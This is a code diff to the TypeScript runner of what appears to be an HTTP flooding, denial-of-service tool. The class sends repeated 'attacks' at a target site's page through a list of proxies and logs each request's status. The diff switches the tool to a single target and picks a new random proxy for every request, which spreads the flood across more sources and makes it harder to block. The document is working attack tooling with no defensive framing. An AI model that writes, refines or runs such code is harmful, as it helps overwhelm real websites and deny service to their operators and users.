@@ -4,7 +4,7 @@ import { TargetData, ProxyData, SiteData } from './types'
 import { HttpHeadersUtils } from './utils/httpHeadersUtils'
 
 export class Runner {
-  private sites: SiteData[]
+  private sites: SiteData
   private proxies: ProxyData[]
   private onlyProxy: boolean
   private readonly ATTACKS_PER_TARGET = 64
@@ -12,7 +12,7 @@ export class Runner {
   public readonly eventSource: EventEmitter
   private requestTimeout: number = 10000
 
-  constructor (props: { sites: SiteData[]; proxies: ProxyData[]; onlyProxy: boolean }) {
+  constructor (props: { sites: SiteData; proxies: ProxyData[]; onlyProxy: boolean }) {
     this.sites = props.sites
     this.proxies = props.proxies
     this.onlyProxy = props.onlyProxy
@@ -39,14 +39,14 @@ export class Runner {
     this.onlyProxy = newProxyValue
   }
 
-  updateConfiguration (config: { sites: SiteData[]; proxies: ProxyData[]; }) {
+  updateConfiguration(config: { sites: SiteData; proxies: ProxyData[] }) {
     this.sites = config.sites
     this.proxies = config.proxies
   }
 
   private async sendTroops () {
     const target = {
-      site: this.sites[Math.floor(Math.random() * this.sites.length)],
+      site: this.sites,
       proxy: this.proxies
     } as TargetData
 
@@ -66,7 +66,6 @@ export class Runner {
       }
     }
 
-    let proxy = null
     for (let attackIndex = 0; (attackIndex < this.ATTACKS_PER_TARGET); attackIndex++) {
       if (!this.active) {
         break
@@ -84,9 +83,7 @@ export class Runner {
           })
           this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
         } else {
-          if (proxy === null) {
-            proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
-          }
+          let proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
           let proxyObj: any = {}
           const proxyAddressSplit = proxy.ip.split(':')
           const proxyIP = proxyAddressSplit[0]
@@ -114,11 +111,9 @@ export class Runner {
 
           if (r.status === 407) {
             console.log(proxy)
-            proxy = null
           }
         }
       } catch (e) {
-        proxy = null
         const code = (e as AxiosError).code || 'UNKNOWN'
         if (code === 'UNKNOWN') {
           console.error(e)
